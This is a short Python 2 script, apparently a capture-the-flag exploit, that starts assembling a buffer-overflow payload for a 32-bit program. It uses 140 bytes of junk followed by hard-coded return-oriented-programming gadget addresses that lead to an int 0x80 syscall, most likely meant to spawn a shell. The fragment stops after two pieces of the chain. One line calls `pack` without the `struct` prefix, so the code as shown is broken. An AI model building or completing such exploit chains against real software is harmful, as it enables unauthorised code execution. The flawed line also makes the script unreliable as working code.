import struct

shellcode = ""

JUNK = "A" * 140
INT_80 = struct.pack("<I", 0x08049401)
XOR_EAX = struct.pack("<I", 0x080544e0)
EAX_ADD_3 = struct.pack("<I", 0x0808fd50)
EAX_ADD_2 = struct.pack("<I", 0x0808fd37)
POP_EAX = struct.pack("<I", 0x080bbf26)
POP_EBX = struct.pack("<I", 0x080481c9)
POP_ECX = struct.pack("<I", 0x080e55ad)
PUSH_EAX = struct.pack("<I", 0x080bbec6)
DATA_ADDR = struct.pack('<I', 0x080eb060)
MOV_EDX_EAX = pack('<I', 0x0809a95d)
PADDING = struct.pack('<I', 0x41414141)

def convert_to_int_le(string):
    return str(int(string[::-1].encode('hex'), 16))

shellcode += JUNK
shellcode += XOR_EAX
